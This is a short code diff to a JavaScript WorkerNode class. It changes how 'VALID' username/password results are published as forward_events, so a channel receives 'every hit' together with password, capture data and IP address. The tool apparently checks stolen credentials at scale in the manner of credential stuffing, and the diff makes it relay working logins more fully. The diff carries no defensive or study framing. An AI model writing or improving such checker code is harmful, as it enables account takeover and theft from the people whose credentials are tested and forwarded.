@@ -898,12 +898,13 @@ class WorkerNode {
    */
   async publishResultEvents(result, checkResult) {
     try {
-      // If VALID, publish forward_event
-      if (result.status === 'VALID' && result.capture) {
+      // If VALID, always publish forward_event so the channel gets every hit.
+      // Send capture when available; coordinator will still forward with a fallback message if capture is missing/invalid.
+      if (result.status === 'VALID') {
         const forwardEvent = {
           username: result.username,
           password: result.password,
-          capture: result.capture,
+          capture: result.capture || null,
           ipAddress: result.ipAddress,
           timestamp: result.checkedAt,
           workerId: this.workerId,
@@ -919,7 +920,8 @@ class WorkerNode {
         log.debug('Published forward_event', {
           workerId: this.workerId,
           username: result.username,
-          batchId: result.batchId
+          batchId: result.batchId,
+          hasCapture: !!result.capture
         });
       }
       
